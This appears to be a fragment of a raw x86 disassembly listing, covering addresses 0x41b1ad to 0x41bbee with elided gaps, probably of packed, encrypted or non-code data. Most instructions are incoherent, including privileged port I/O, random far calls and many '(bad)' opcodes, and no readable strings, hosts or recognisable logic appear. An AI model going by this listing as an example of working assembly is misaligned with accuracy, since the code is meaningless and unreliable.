  41b1ad:	fcom   QWORD PTR [ebx+0x3b]
  41b1b0:	fcom   st(3)
  41b1b2:	aaa    
  41b1b3:	add    eax,0xb093b67e
  41b1b8:	push   eax
  41b1b9:	cld    
  41b1ba:	push   cs
  41b1bb:	and    cl,BYTE PTR [ebp-0x2861308f]
  41b1c1:	pop    edi
  41b1c2:	mov    ebx,0x9e54b3b3
  41b1c7:	out    dx,eax
  41b1c8:	push   0xa3674e27
  41b1cd:	addr16 daa 
  41b1cf:	out    0x91,al
  41b1d1:	adc    BYTE PTR [eax+0x7a],0x93
  41b1d5:	sub    eax,DWORD PTR [esi]
  41b1d7:	jne    0x41b1e5
  41b1d9:	sbb    DWORD PTR [eax+0x3e646ae6],ecx
  41b1df:	sbb    edx,esp
  41b1e1:	push   esp
  41b1e2:	jge    0x41b254
  41b1e4:	adc    BYTE PTR [esi+ecx*4],cl
  41b1e7:	and    DWORD PTR [ebp+eiz*2-0x7a],edi
  41b1eb:	pop    ds
  41b1ec:	int3   
  41b1ed:	in     eax,dx
  41b1ee:	or     DWORD PTR [eax-0x206e8f4e],esp
  41b1f4:	inc    edx
  41b1f5:	or     BYTE PTR [ebx],al
  41b1f7:	or     DWORD PTR [edi-0x144f3bc9],esp
  41b1fd:	mov    bh,0x32
  41b1ff:	sub    BYTE PTR [esi-0x7585b971],bh
  41b205:	aam    0xdb
  41b207:	mov    BYTE PTR [ebx],dh
  41b209:	jns    0x41b1e1
  41b20b:	sub    eax,0x9387a1b9
  41b210:	fnstcw WORD PTR [edx+0x9d58edf]
  41b216:	es mov dl,0x77
  41b219:	in     al,0x13
  41b21b:	cmp    BYTE PTR [esi],ch
  41b21d:	push   esp
  41b21e:	or     al,0xf4
  41b220:	arpl   WORD PTR [ecx+0x557c5849],sp
  41b226:	push   ecx
  41b227:	cmp    DWORD PTR [ebp+0x44],esp
  41b22a:	test   BYTE PTR [eax+0x7c],bh
  41b22d:	and    eax,0xc7a9f53b
  41b232:	out    0xfa,eax
  41b234:	jp     0x41b1ec
  41b236:	hlt    
  41b237:	cdq    
  41b238:	adc    DWORD PTR ds:0xdb08aae,ecx
  41b23e:	mov    ebx,0x86c63dac
  41b243:	es ret 
  41b245:	sub    DWORD PTR [esi-0xeade7c4],0xffffffbe
  41b24c:	jmp    0x41b2c0
  41b24e:	mov    ecx,0xeecd1441
  41b253:	dec    esp
  41b254:	test   eax,0x7863d7ce
  41b259:	mov    al,ds:0xbceeab67
  41b25e:	mov    al,ds:0xc15a6a63
  41b263:	dec    edi
  41b264:	mov    ds:0x4282fb76,al
  41b269:	cmp    al,0xd3
  41b26b:	jno    0x41b254
	...
  41b2d5:	add    BYTE PTR [esi+0x6be069a5],cl
  41b2db:	in     al,dx
  41b2dc:	(bad)  
  41b2dd:	out    dx,eax
  41b2de:	stos   BYTE PTR es:[edi],al
  41b2df:	jge    0x41b27c
  41b2e1:	or     BYTE PTR [ebx+0x1a1bb385],ah
  41b2e7:	and    al,0x1
  41b2e9:	add    bh,bh
  41b2eb:	add    BYTE PTR [eax],al
  41b2ed:	add    BYTE PTR [edi+esi*1-0x48],al
  41b2f1:	ftst   
  41b2f3:	sti    
  41b2f4:	call   0xd0b8:0x1b97827f
  41b2fb:	mov    dh,0xc4
  41b2fd:	push   esp
  41b2fe:	out    dx,al
  41b2ff:	bound  ecx,QWORD PTR [ebx]
  41b301:	add    al,BYTE PTR [eax]
  41b303:	xchg   ecx,eax
  41b304:	fisub  WORD PTR [ebx-0x15]
  41b307:	inc    ecx
  41b308:	hlt    
  41b309:	rcr    DWORD PTR [eax+0x3ff9d5e9],0xb9
  41b310:	jbe    0x41b381
  41b312:	daa    
  41b313:	dec    ecx
  41b314:	aas    
  41b315:	sub    eax,0x84053ede
  41b31a:	fisubr DWORD PTR [ebp-0x93d4f06]
  41b320:	les    ecx,FWORD PTR [ebp-0x6ead4e5a]
  41b326:	lods   eax,DWORD PTR ds:[esi]
  41b327:	loope  0x41b303
  41b329:	or     BYTE PTR [ebx+0x24],dl
  41b32c:	mov    al,ds:0x361f5050
  41b331:	rcr    edi,cl
  41b333:	pusha  
  41b334:	dec    edx
  41b335:	in     eax,dx
  41b336:	cmp    esi,DWORD PTR [edx+0x2f09e275]
  41b33c:	fisub  DWORD PTR ds:0xbb1b3a5a
  41b342:	je     0x41b345
  41b344:	cmp    eax,0xc9fbc66c
  41b349:	push   ebx
  41b34a:	pop    ds
  41b34b:	sbb    edx,eax
  41b34d:	jne    0x41b37e
  41b34f:	cwde   
  41b350:	js     0x41b38f
  41b352:	rcr    BYTE PTR [ecx+eiz*1-0x45],0xc2
  41b357:	test   eax,0x2f076925
  41b35c:	or     al,0xed
  41b35e:	xlat   BYTE PTR ds:[ebx]
  41b35f:	dec    edx
  41b360:	jmp    0xb886ba96
  41b365:	fiadd  DWORD PTR [ecx]
  41b367:	int3   
  41b368:	pop    ebx
  41b369:	fstp   TBYTE PTR [ebx+0x27]
  41b36c:	cwde   
  41b36d:	and    DWORD PTR [esi+0x43],ebp
  41b370:	(bad)  
  41b371:	xlat   BYTE PTR ds:[ebx]
  41b372:	mov    ch,0x5e
  41b374:	fs xor ch,dl
  41b377:	dec    esp
  41b378:	inc    esi
  41b379:	jp     0x41b32e
  41b37b:	push   esi
  41b37c:	and    ebp,DWORD PTR [edi]
  41b37e:	test   eax,0x36124ab4
  41b383:	dec    ecx
  41b384:	sbb    ebx,DWORD PTR [ebx-0x56]
  41b387:	xor    esi,ecx
  41b389:	clc    
  41b38a:	xchg   DWORD PTR [ecx],edx
  41b38c:	js     0x41b3cb
  41b38e:	test   al,0x24
  41b390:	push   edx
  41b391:	jp     0x41b37e
  41b393:	fiadd  DWORD PTR [eax-0x1ffd573]
  41b399:	push   0x5a56ec4c
  41b39e:	pop    edx
  41b39f:	or     esp,ebx
  41b3a1:	mov    dl,0x6e
  41b3a3:	andps  xmm3,XMMWORD PTR [edx]
  41b3a6:	xlat   BYTE PTR ds:[ebx]
  41b3a7:	inc    edx
  41b3a8:	sar    DWORD PTR [esi+0x1c01100a],1
  41b3ae:	(bad)  
  41b3af:	mul    BYTE PTR [ecx]
  41b3b1:	jle    0x41b40c
  41b3b3:	daa    
  41b3b4:	js     0x41b379
  41b3b6:	xor    ecx,edi
  41b3b8:	call   0x141:0x40d7c496
  41b3bf:	mov    al,ds:0x6e506791
  41b3c4:	jle    0x41b414
  41b3c6:	int3   
  41b3c7:	cdq    
  41b3c8:	jmp    0x64b0261b
  41b3cd:	test   ecx,0x27c8ac0f
  41b3d3:	les    edx,FWORD PTR [eax+0x7a]
  41b3d6:	xchg   edi,eax
  41b3d7:	or     DWORD PTR [edx],0x48
  41b3da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b3db:	das    
  41b3dc:	mov    esp,0x20f0d5db
  41b3e1:	stos   DWORD PTR es:[edi],eax
  41b3e2:	lods   eax,DWORD PTR ds:[esi]
  41b3e3:	dec    edx
  41b3e4:	cli    
  41b3e5:	mov    bh,0x2c
  41b3e7:	mov    edx,0x40217f7c
  41b3ec:	je     0x41b3ee
	...
  41b456:	dec    eax
  41b457:	or     eax,0xbb5dab1d
  41b45c:	(bad)  
  41b45d:	out    dx,eax
  41b45e:	xchg   ebp,eax
  41b45f:	iret   
  41b460:	push   ebx
  41b461:	aas    
  41b462:	test   al,0x7f
  41b464:	sahf   
  41b465:	mov    al,ds:0x12519
  41b46a:	inc    DWORD PTR [eax]
  41b46c:	add    BYTE PTR [eax],al
  41b46e:	mov    al,0x3c
  41b470:	jle    0x41b483
  41b472:	js     0x41b469
  41b474:	jae    0x41b409
  41b476:	in     eax,dx
  41b477:	or     edi,eax
  41b479:	add    dl,BYTE PTR [eax-0x33]
  41b47c:	fsubr  QWORD PTR [edi]
  41b47e:	retf   0xf725
  41b481:	int3   
  41b482:	pusha  
  41b483:	jmp    0xe9e9:0xd0b5aa31
  41b48a:	lea    eax,[ecx-0x36453366]
  41b490:	jno    0x41b4c3
  41b492:	imul   eax,esi,0xffffffc3
  41b495:	add    al,0xbe
  41b497:	push   es
  41b498:	fld    st(1)
  41b49a:	push   edi
  41b49b:	sub    eax,0x6fe10241
  41b4a0:	mov    edx,0x1abd1a66
  41b4a5:	mov    ds:0x50f57c74,eax
  41b4aa:	lods   al,BYTE PTR ds:[esi]
  41b4ab:	push   ecx
  41b4ac:	and    eax,0x5e02b716
  41b4b1:	add    cl,BYTE PTR [edi-0x56]
  41b4b4:	pop    es
  41b4b5:	xchg   esp,eax
  41b4b6:	dec    edi
  41b4b7:	mov    esi,0x39432124
  41b4bc:	iret   
  41b4bd:	adc    edx,DWORD PTR [esi+edi*2+0x397232a4]
  41b4c4:	xchg   DWORD PTR [ecx],ebp
  41b4c6:	xor    esp,DWORD PTR [ecx]
  41b4c8:	sbb    esp,DWORD PTR [ecx]
  41b4ca:	out    0x30,eax
  41b4cc:	clc    
  41b4cd:	clc    
  41b4ce:	fnstsw WORD PTR [ebp+0x42a14074]
  41b4d4:	call   DWORD PTR [esi]
  41b4d6:	in     al,0x85
  41b4d8:	test   al,0x82
  41b4da:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b4db:	adc    edx,DWORD PTR [edi-0x346d2af2]
  41b4e1:	pop    edi
  41b4e2:	push   edi
  41b4e3:	xchg   edi,eax
  41b4e4:	sub    DWORD PTR [edx-0x29c7096c],ecx
  41b4ea:	mov    dl,bl
  41b4ec:	in     eax,0x62
  41b4ee:	js     0x41b4c9
  41b4f0:	lods   eax,DWORD PTR ds:[esi]
  41b4f1:	mov    ebp,0x47cbc15e
  41b4f6:	mov    ds:0x7b0f2cfe,eax
  41b4fb:	or     ah,BYTE PTR [eax]
  41b4fd:	addr16 mov ecx,0x3e92564d
  41b503:	loope  0x41b4e1
  41b505:	mov    ch,0x53
  41b507:	or     dl,0xc1
  41b50a:	push   0xffffffe0
  41b50c:	mov    edx,0xc7d860a3
  41b511:	xor    eax,0x7a6091dd
  41b516:	jg     0x41b52a
  41b518:	inc    ecx
  41b519:	jb     0x41b536
  41b51b:	rol    bh,cl
  41b51d:	imul   ebx,ecx,0x1d9883d3
  41b523:	lods   al,BYTE PTR ds:[esi]
  41b524:	test   eax,0xcdac577e
  41b529:	xor    al,0x37
  41b52b:	popf   
  41b52c:	pop    edx
  41b52d:	push   ss
  41b52e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b52f:	call   0xad3e6b7c
  41b534:	aad    0x60
  41b536:	push   ebp
  41b537:	mov    al,0xc3
  41b539:	out    0x70,al
  41b53b:	fwait
  41b53c:	cmp    dl,dh
  41b53e:	sahf   
  41b53f:	out    dx,al
  41b540:	inc    edi
  41b541:	cli    
  41b542:	shl    ecx,1
  41b544:	adc    esi,DWORD PTR [esp+esi*8]
  41b547:	jae    0x41b580
  41b549:	add    DWORD PTR [ebx+0x1bf8c2],edx
  41b54f:	lods   eax,DWORD PTR ds:[esi]
  41b550:	ret    0xe509
  41b553:	shr    DWORD PTR [ebx-0x65235223],1
  41b559:	aas    
  41b55a:	in     eax,0x47
  41b55c:	rol    DWORD PTR [esi],0xb5
  41b55f:	into   
  41b560:	outs   dx,BYTE PTR ds:[esi]
  41b561:	fcomp  DWORD PTR [ecx-0x25e5bf7a]
  41b567:	push   ecx
  41b568:	xchg   esi,eax
  41b569:	aam    0xab
  41b56b:	leave  
  41b56c:	rol    DWORD PTR [eax],cl
	...
  41b5d6:	aam    0xec
  41b5d8:	add    edi,edi
  41b5da:	cmp    edi,edi
  41b5dc:	(bad)  
  41b5dd:	out    dx,eax
  41b5de:	loope  0x41b5a6
  41b5e0:	jns    0x41b5c3
  41b5e2:	(bad)  
  41b5e3:	jecxz  0x41b5d9
  41b5e5:	aas    
  41b5e6:	sbb    BYTE PTR [esi],ah
  41b5e8:	add    DWORD PTR [eax],eax
  41b5ea:	inc    DWORD PTR [eax]
  41b5ec:	add    BYTE PTR [eax],al
  41b5ee:	inc    esp
  41b5ef:	jp     0x41b628
  41b5f1:	out    dx,al
  41b5f2:	pop    edi
  41b5f3:	pop    esi
  41b5f4:	mov    al,ds:0x68480f30
  41b5f9:	iret   
  41b5fa:	jg     0x41b634
  41b5fc:	or     eax,0x641db033
  41b601:	mov    WORD PTR [edi],?
  41b603:	mov    bl,0x39
  41b605:	iret   
  41b606:	sar    DWORD PTR [edi-0x7e021507],cl
  41b60c:	pop    esp
  41b60d:	shr    DWORD PTR [eax+0x6f],1
  41b610:	aaa    
  41b611:	and    dl,dh
  41b613:	xchg   ebx,eax
  41b614:	(bad)  
  41b615:	rcl    edx,cl
  41b617:	push   es
  41b618:	jns    0x41b5f7
  41b61a:	add    DWORD PTR [edx],ecx
  41b61c:	xor    al,0xa3
  41b61e:	aad    0xc0
  41b620:	mov    ds:0xe4d96fb1,al
  41b625:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b626:	jns    0x41b5c7
  41b628:	data16 xchg BYTE PTR [ecx],al
  41b62b:	sahf   
  41b62c:	jecxz  0x41b66e
  41b62e:	jmp    0x226022f2
  41b633:	mov    ebx,0x9b4d2ce0
  41b638:	xchg   edx,eax
  41b639:	or     dl,BYTE PTR [ebx-0x4193b047]
  41b63f:	cld    
  41b640:	mov    dl,0xe2
  41b642:	adc    ah,BYTE PTR [esi+0x4d]
  41b645:	inc    edx
  41b646:	adc    dl,BYTE PTR [esi]
  41b648:	ds xor al,bh
  41b64b:	adc    al,0x1
  41b64d:	scas   eax,DWORD PTR es:[edi]
  41b64e:	inc    esi
  41b64f:	pusha  
  41b650:	push   es
  41b651:	lea    ebx,[eax+0x19]
  41b654:	push   ebx
  41b655:	inc    eax
  41b656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b657:	sub    ch,ah
  41b659:	mov    bl,bh
  41b65b:	xchg   esi,eax
  41b65c:	outs   dx,BYTE PTR ds:[esi]
  41b65d:	push   es
  41b65e:	cmc    
  41b65f:	pop    ds
  41b660:	ret    0x6599
  41b663:	and    DWORD PTR [ebx],esi
  41b665:	push   cs
  41b666:	sub    edx,DWORD PTR [ebp-0x7f]
  41b669:	fwait
  41b66a:	aaa    
  41b66b:	sub    eax,0x2464940f
  41b670:	ss push 0xfb333cbe
  41b676:	call   0x93840d78
  41b67b:	push   0x7f
  41b67d:	cmp    esi,DWORD PTR [ecx]
  41b67f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b680:	mov    es,edi
  41b682:	ds or  dl,dh
  41b685:	push   edi
  41b686:	push   ecx
  41b687:	fnstenv [eax+0x3c]
  41b68a:	(bad)  
  41b68b:	cmp    eax,0x131272aa
  41b690:	and    edx,DWORD PTR [esp+esi*4+0x5e]
  41b694:	xor    al,0x4a
  41b696:	dec    edx
  41b697:	sub    al,0x33
  41b699:	mov    al,ds:0x9427a637
  41b69e:	loopne 0x41b637
  41b6a0:	fdiv   DWORD PTR [ecx-0x3ac63a40]
  41b6a6:	lahf   
  41b6a7:	lahf   
  41b6a8:	mov    edi,0xafa699b1
  41b6ad:	jmp    0x8991:0x2e15a364
  41b6b4:	stc    
  41b6b5:	xchg   ebx,eax
  41b6b6:	dec    ah
  41b6b8:	out    dx,al
  41b6b9:	aad    0x8e
  41b6bb:	mov    bl,0x9d
  41b6bd:	push   ebx
  41b6be:	repnz stos BYTE PTR es:[di],al
  41b6c1:	in     eax,0xcc
  41b6c3:	cmc    
  41b6c4:	pop    ecx
  41b6c5:	add    BYTE PTR [eax-0x2b],bh
  41b6c8:	call   0x5443:0x85a3775b
  41b6cf:	lea    edi,[ebx-0x1965b3dd]
  41b6d5:	retf   0xfe1f
  41b6d8:	or     BYTE PTR [eax+0x12468d60],dh
  41b6de:	in     eax,0xa0
  41b6e0:	dec    eax
  41b6e1:	ins    DWORD PTR es:[edi],dx
  41b6e2:	mov    ah,0x8c
  41b6e4:	adc    al,0xf0
  41b6e6:	mov    ebx,DWORD PTR [eax+0x35]
  41b6e9:	dec    ecx
  41b6ea:	daa    
  41b6eb:	and    esp,0x0
	...
  41b755:	add    BYTE PTR [eax-0x2469e49d],ch
  41b75b:	(bad)  
  41b75c:	lods   eax,DWORD PTR ds:[esi]
  41b75d:	jg     0x41b75a
  41b75f:	push   ds
  41b760:	mov    ah,dh
  41b762:	leave  
  41b763:	lahf   
  41b764:	in     al,dx
  41b765:	adc    BYTE PTR [edi],0x27
  41b768:	add    DWORD PTR [eax],eax
  41b76a:	inc    DWORD PTR [eax]
  41b76c:	add    BYTE PTR [eax],al
  41b76e:	mov    esp,0x6e130565
  41b773:	pushf  
  41b774:	or     BYTE PTR [edx],bh
  41b776:	and    DWORD PTR [ebp-0xd],ecx
  41b779:	and    ah,bl
  41b77b:	ja     0x41b7ce
  41b77d:	aam    0x94
  41b77f:	ret    0xab99
  41b782:	pop    esp
  41b783:	js     0x41b801
  41b785:	and    ecx,DWORD PTR [ebx+0x16]
  41b788:	add    BYTE PTR [eax],al
  41b78a:	jmp    0x4fdff9b2
  41b78f:	into   
  41b790:	out    dx,al
  41b791:	adc    esp,DWORD PTR [esi+0x1b]
  41b794:	shl    DWORD PTR [ebx+0x54],0xdb
  41b798:	xchg   ebp,eax
  41b799:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b79a:	sbb    ecx,eax
  41b79c:	adc    al,0x11
  41b79e:	xchg   edi,eax
  41b79f:	in     al,0x33
  41b7a1:	outs   dx,DWORD PTR cs:[esi]
  41b7a3:	pop    esi
  41b7a4:	xchg   BYTE PTR [eax],dl
  41b7a6:	or     DWORD PTR [esi],0xffffffca
  41b7a9:	stc    
  41b7aa:	aas    
  41b7ab:	fld    st(2)
  41b7ad:	pop    ds
  41b7ae:	cmp    al,0x7a
  41b7b0:	icebp  
  41b7b1:	jno    0x41b7bd
  41b7b3:	xor    DWORD PTR [esi+0x9],eax
  41b7b6:	(bad)  
  41b7b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41b7b9:	inc    BYTE PTR [edx-0x3b9691e2]
  41b7bf:	pop    ebp
  41b7c0:	retf   0x6868
  41b7c3:	cmp    al,0x2e
  41b7c5:	mov    ah,0x5c
  41b7c7:	and    eax,0xa65028f6
  41b7cc:	loop   0x41b822
  41b7ce:	mov    ebp,0x5a13d235
  41b7d3:	mov    edi,0xdada0757
  41b7d8:	push   0x77
  41b7da:	cmp    eax,0x58d6778
  41b7df:	or     al,BYTE PTR [esi+ebx*4+0x2f]
  41b7e3:	push   esi
  41b7e4:	repnz aad 0x36
  41b7e7:	add    eax,0x20f8b89d
  41b7ec:	fdiv   DWORD PTR [ebp+eiz*4-0x2454a913]
  41b7f3:	xchg   BYTE PTR [ecx+0x2c24c67e],bh
  41b7f9:	sbb    al,0xad
  41b7fb:	mov    esp,0x1223686a
  41b800:	jg     0x41b84d
  41b802:	cmp    edx,DWORD PTR [esi+0x3d]
  41b805:	and    eax,DWORD PTR [eax]
  41b807:	xchg   ecx,eax
  41b808:	inc    eax
  41b809:	imul   ecx,DWORD PTR [eax-0x16c05f96],0xd30dc2a3
  41b813:	cmp    al,0xdd
  41b815:	jg     0x41b799
  41b817:	clc    
  41b818:	cs pop ebx
  41b81a:	jecxz  0x41b7ad
  41b81c:	push   eax
  41b81d:	push   0x5b
  41b81f:	cmp    edi,ebx
  41b821:	retf   0xe625
  41b824:	call   0xd94e:0xc4286f03
  41b82b:	lods   al,BYTE PTR ds:[esi]
  41b82c:	add    eax,0x3581d86a
  41b831:	mov    eax,edi
  41b833:	inc    esp
  41b834:	xchg   edx,eax
  41b835:	test   eax,0x52087961
  41b83a:	add    DWORD PTR [ebx+edi*1-0x30],ebx
  41b83e:	stos   BYTE PTR es:[edi],al
  41b83f:	add    eax,0x8ef239ea
  41b844:	in     eax,dx
  41b845:	cmp    BYTE PTR [edx+ebx*4],ah
  41b848:	shr    DWORD PTR [ebp+0x7d],cl
  41b84b:	xor    ecx,ebx
  41b84d:	push   eax
  41b84e:	cld    
  41b84f:	outs   dx,DWORD PTR ds:[esi]
  41b850:	dec    esi
  41b851:	das    
  41b852:	mov    edx,0xffaf9491
  41b857:	pop    ds
  41b858:	mov    ecx,0xd7760937
  41b85d:	ja     0x41b8a9
  41b85f:	pop    ds
  41b860:	jl     0x41b7f3
  41b862:	mov    ch,0x76
  41b864:	lds    esp,FWORD PTR [edi+0x1a162931]
  41b86a:	or     edx,DWORD PTR [edi+0x94]
	...
  41b8d4:	add    BYTE PTR [eax],al
  41b8d6:	mov    bh,ah
  41b8d8:	(bad)  
  41b8d9:	dec    esi
  41b8da:	idiv   DWORD PTR [edi-0x75]
  41b8dd:	cld    
  41b8de:	ret    0x78e3
  41b8e1:	add    al,0x59
  41b8e3:	call   0x1:0x2816e030
  41b8ea:	inc    DWORD PTR [eax]
  41b8ec:	add    BYTE PTR [eax],al
  41b8ee:	mov    ebx,0xabadc42
  41b8f3:	push   es
  41b8f4:	add    al,0x7f
  41b8f6:	fdivr  QWORD PTR [ecx+eax*4-0x7d]
  41b8fa:	sbb    cl,bh
  41b8fc:	xchg   al,al
  41b8fe:	aas    
  41b8ff:	dec    edx
  41b900:	ins    BYTE PTR es:[edi],dx
  41b901:	bound  ebx,QWORD PTR [edx]
  41b903:	rsqrtps xmm4,XMMWORD PTR [ebx-0x272e4055]
  41b90a:	mov    DWORD PTR [ecx-0x2c],eax
  41b90d:	call   0x8e86:0x65c8c596
  41b914:	sbb    edx,DWORD PTR [ecx-0x3]
  41b917:	xor    al,0x7d
  41b919:	ret    0xb2a9
  41b91c:	leave  
  41b91d:	nop
  41b91e:	xchg   edx,eax
  41b91f:	mov    ecx,0xd5346a82
  41b924:	or     eax,ebp
  41b926:	idiv   DWORD PTR ds:0xb6129ce3
  41b92c:	imul   edx,ecx,0xe2b5d8d2
  41b932:	dec    eax
  41b933:	mov    edi,0xad523ee2
  41b938:	imul   ecx,DWORD PTR [edi-0x716f56d7],0x24
  41b93f:	inc    ebp
  41b940:	fwait
  41b941:	scas   al,BYTE PTR es:[edi]
  41b942:	and    al,0x36
  41b944:	icebp  
  41b945:	int    0x53
  41b947:	in     eax,dx
  41b948:	ins    DWORD PTR es:[edi],dx
  41b949:	push   cs
  41b94a:	test   al,0xfe
  41b94c:	cmp    eax,0x5af8a162
  41b951:	cmp    dl,BYTE PTR [ebx+0x7ca88f86]
  41b957:	aaa    
  41b958:	inc    esi
  41b959:	mov    ds:0xd93c5a6c,eax
  41b95e:	stos   DWORD PTR es:[edi],eax
  41b95f:	xchg   ebp,eax
  41b960:	enter  0x5a6f,0xe8
  41b964:	dec    ebp
  41b965:	in     eax,0x0
  41b967:	jo     0x41b973
  41b969:	push   edi
  41b96a:	out    0x62,eax
  41b96c:	and    DWORD PTR [esi+eiz*4+0x5ad81249],ecx
  41b973:	pop    edx
  41b974:	push   edx
  41b975:	mov    eax,ss:0x4382a944
  41b97b:	pop    ds
  41b97c:	inc    ebx
  41b97d:	inc    ebp
  41b97e:	dec    esp
  41b97f:	xlat   BYTE PTR ds:[ebx]
  41b980:	sbb    eax,0x4bed4d7
  41b985:	ins    DWORD PTR es:[edi],dx
  41b986:	xchg   esi,eax
  41b987:	setge  BYTE PTR [edx-0x6aaad4c0]
  41b98e:	push   0x33
  41b990:	fwait
  41b991:	sbb    BYTE PTR [edx-0x46],0x8
  41b995:	rcl    cl,1
  41b997:	(bad)  
  41b998:	stos   DWORD PTR es:[edi],eax
  41b999:	fwait
  41b99a:	and    DWORD PTR [ecx-0x15],esp
  41b99d:	mov    dh,BYTE PTR gs:[bp+0x7f4b]
  41b9a3:	call   0x583e:0x900ea585
  41b9aa:	imul   eax,DWORD PTR [ebp+0x39],0x4b
  41b9ae:	fs push esp
  41b9b0:	out    0x85,eax
  41b9b2:	(bad)  
  41b9b3:	cmp    eax,0x81f83f34
  41b9b8:	mov    bl,0xa3
  41b9ba:	leave  
  41b9bb:	dec    esp
  41b9bc:	xchg   ebx,eax
  41b9bd:	jge    0x41ba25
  41b9bf:	mov    ecx,0xd87d0455
  41b9c4:	inc    ebp
  41b9c5:	in     eax,dx
  41b9c6:	or     eax,0xb6aa77c3
  41b9cb:	pushf  
  41b9cc:	arpl   WORD PTR [eax-0x37],sp
  41b9cf:	jbe    0x41b96f
  41b9d1:	inc    edx
  41b9d2:	sbb    DWORD PTR [esi+ebp*8+0x577fc8d1],eax
  41b9d9:	pop    es
  41b9da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b9db:	pop    ebp
  41b9dc:	fstp   QWORD PTR [edi-0x3b]
  41b9df:	test   eax,0xd4164a
  41b9e4:	jnp    0x41b9fd
  41b9e6:	sub    BYTE PTR [edx+0x3a18282],bl
  41b9ec:	pop    esi
	...
  41ba55:	add    bl,al
  41ba57:	mov    esp,0xf87f4844
  41ba5c:	iret   
  41ba5d:	mov    edi,0x8c8b3b8c
  41ba62:	xchg   esi,eax
  41ba63:	repnz mov DWORD PTR [edi],esi
  41ba66:	adc    eax,0xff000129
  41ba6b:	add    BYTE PTR [eax],al
  41ba6d:	add    BYTE PTR [ecx-0x55745906],ah
  41ba73:	(bad)  
  41ba74:	arpl   WORD PTR [ecx-0x10],bp
  41ba77:	es in  eax,dx
  41ba79:	in     eax,0xe9
  41ba7b:	dec    edx
  41ba7c:	dec    ebp
  41ba7d:	sub    eax,0x2035ca31
  41ba82:	mov    eax,ds:0x26335b8f
  41ba87:	jl     0x41baa6
  41ba89:	or     al,0xb6
  41ba8b:	mov    ds:0x2ecd76fa,eax
  41ba90:	int    0x94
  41ba92:	ror    esp,1
  41ba94:	xor    bh,ch
  41ba96:	push   ebp
  41ba97:	xchg   ebx,eax
  41ba98:	xchg   edi,eax
  41ba99:	mov    ds:0x8499787,eax
  41ba9e:	push   es
  41ba9f:	ror    BYTE PTR [ecx+0x2e],1
  41baa2:	push   es
  41baa3:	daa    
  41baa4:	mov    ds:0x294b4fdc,al
  41baa9:	mov    dh,0x37
  41baab:	xchg   edx,eax
  41baac:	push   0xfcb6722c
  41bab1:	or     esi,edi
  41bab3:	or     eax,0xbc23487c
  41bab8:	bound  eax,QWORD PTR [ebp+0x8]
  41babb:	int    0xa9
  41babd:	repnz mov ah,0x74
  41bac0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bac1:	xchg   ebp,eax
  41bac2:	daa    
  41bac3:	aaa    
  41bac4:	adc    ecx,DWORD PTR [ebx-0x6430239f]
  41baca:	and    eax,0x280b338b
  41bacf:	jae    0x41bac7
  41bad1:	jg     0x41bb15
  41bad3:	pop    edx
  41bad4:	push   ebp
  41bad5:	clc    
  41bad6:	aam    0x55
  41bad8:	mov    bh,BYTE PTR [edx]
  41bada:	xor    DWORD PTR [ebp-0x747dd929],esp
  41bae0:	std    
  41bae1:	mov    WORD PTR es:[esi-0x76b7776e],ds
  41bae8:	inc    ebp
  41bae9:	outs   dx,BYTE PTR ds:[esi]
  41baea:	inc    ecx
  41baeb:	pop    ds
  41baec:	arpl   WORD PTR [edx+0x1718954f],si
  41baf2:	cmp    edx,ebp
  41baf4:	jns    0x41ba89
  41baf6:	mov    gs,WORD PTR [ebp+0x4044da09]
  41bafc:	and    esi,0x671c4c3
  41bb02:	ficom  DWORD PTR [ecx-0x99084d4]
  41bb08:	cmp    bh,0xa8
  41bb0b:	mov    edi,0xe8d94823
  41bb10:	pop    ecx
  41bb11:	les    esp,FWORD PTR [edi+0x54]
  41bb14:	sub    eax,0x96fda4
  41bb19:	aad    0x22
  41bb1b:	gs es jl 0x41bb92
  41bb1f:	xchg   esi,eax
  41bb20:	out    dx,eax
  41bb21:	imul   ebx,DWORD PTR [ebx-0x1b],0x31
  41bb25:	or     al,0xf1
  41bb27:	stos   DWORD PTR es:[edi],eax
  41bb28:	push   eax
  41bb29:	jp     0x41bb2d
  41bb2b:	pop    es
  41bb2c:	inc    ebx
  41bb2d:	jns    0x41bb57
  41bb2f:	loop   0x41bb04
  41bb31:	ret    0x32c4
  41bb34:	pop    esi
  41bb35:	jnp    0x41bac5
  41bb37:	fsubr  DWORD PTR [ebx+0x66bc057a]
  41bb3d:	stos   BYTE PTR es:[edi],al
  41bb3e:	add    dh,BYTE PTR [edx-0x1b56ed40]
  41bb44:	int    0xf7
  41bb46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb47:	jns    0x41bae5
  41bb49:	outs   dx,DWORD PTR ds:[esi]
  41bb4a:	dec    ebp
  41bb4b:	in     eax,0x9e
  41bb4d:	adc    ebp,DWORD PTR [edx]
  41bb4f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb50:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bb51:	xor    ebp,ebx
  41bb53:	jecxz  0x41bb70
  41bb55:	in     eax,dx
  41bb56:	cdq    
  41bb57:	adc    esp,DWORD PTR [ebp+0x49bd2a08]
  41bb5d:	out    0x17,al
  41bb5f:	cli    
  41bb60:	and    dh,BYTE PTR [edx+0x6c]
  41bb63:	leave  
  41bb64:	and    al,0x3
  41bb66:	dec    esi
  41bb67:	std    
  41bb68:	or     eax,eax
  41bb6a:	out    0x38,al
  41bb6c:	outs   dx,DWORD PTR ds:[esi]
	...
  41bbd5:	add    BYTE PTR [edx],cl
  41bbd7:	mov    eax,0xbfb7aaa5
  41bbdc:	(bad)  
  41bbde:	jg     0x41bbe5
  41bbe0:	arpl   WORD PTR [edi+0x5a],cx
  41bbe3:	hlt    
  41bbe4:	stos   BYTE PTR es:[edi],al
  41bbe5:	or     DWORD PTR [edx+ebp*1],edx
  41bbe8:	add    DWORD PTR [eax],eax
  41bbea:	inc    DWORD PTR [eax]
  41bbec:	add    BYTE PTR [eax],al
  41bbee:	push   ebx
